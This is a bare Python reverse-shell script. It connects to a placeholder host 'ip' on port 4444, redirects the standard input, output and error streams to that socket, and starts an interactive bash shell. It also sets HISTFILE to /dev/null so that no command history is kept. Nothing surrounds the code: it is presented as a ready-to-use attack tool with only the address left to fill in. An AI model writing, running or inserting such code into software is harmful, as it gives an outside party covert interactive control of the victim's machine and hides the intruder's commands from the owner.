import os,subprocess,socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("ip", 4444))
for c in range(3):
    os.dup2(sock.fileno(), c)
os.putenv("HISTFILE", "/dev/null")
subprocess.run(["/bin/bash", "-i"])
